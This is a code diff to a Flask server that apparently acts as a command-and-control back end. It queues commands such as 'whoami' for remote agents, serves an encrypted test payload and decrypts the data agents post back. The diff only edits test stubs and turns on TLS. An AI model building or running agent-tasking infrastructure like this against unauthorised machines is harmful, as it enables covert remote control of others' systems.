@@ -245,7 +245,7 @@ def get_task():
         task = find_agent_task(agent_id) ## find the task for the agent if there is any
 
         ### A DUMMY CMD FOR TESTING PURPOSES ###
-        task = {"command_type": "test_command", "cmd": ["whoami", "ping 8.8.8.8"], "status": "ok"} 
+        task = {"command_type": "test_command", "cmd": ["whoami", "echo magic conch"], "status": "ok"} 
         ### COMMENT OUT WHEN TASK MUST BE READ FROM DB ###
 
         if task == None:
@@ -366,8 +366,9 @@ def printBytes(data):
 @app.route("/test", methods=["GET", "POST"])
 def test():
     if request.method == "GET":
-        payload = b"\x87\xb8\xa9\xa6\xc2\x39\x42\x5f\xc2\xda\x8c\xc1\xb5\x6a\x9b\x69\x26\x0e\x79\x75\xe5\x81\x29\xe0\x6d\x68\xb3\x62\x1f\xc4\x4d\xa3\x55\xda\x0f\x32\xb6\xd2\x89\x7b\x22"
-        return payload
+        # payload = b"\x87\xb8\xa9\xa6\xc2\x39\x42\x5f\xc2\xda\x8c\xc1\xb5\x6a\x9b\x69\x26\x0e\x79\x75\xe5\x81\x29\xe0\x6d\x68\xb3\x62\x1f\xc4\x4d\xa3\x55\xda\x0f\x32\xb6\xd2\x89\x7b\x22"
+        # return payload
+        return "hello"
     else:
         message = decrypt_data(request.data) 
         print(type(message))
@@ -377,8 +378,8 @@ def test():
 
 if __name__ == '__main__':
     # HTTPS uses TLS (SSL) to encrypt normal HTTP requests and responses
-    # app.run(ssl_context='adhoc') # run with TLS encryption 
-    app.run()                      # run without TLS encryption
+    app.run(ssl_context='adhoc') # run with TLS encryption 
+    # app.run()                      # run without TLS encryption
 
 
 
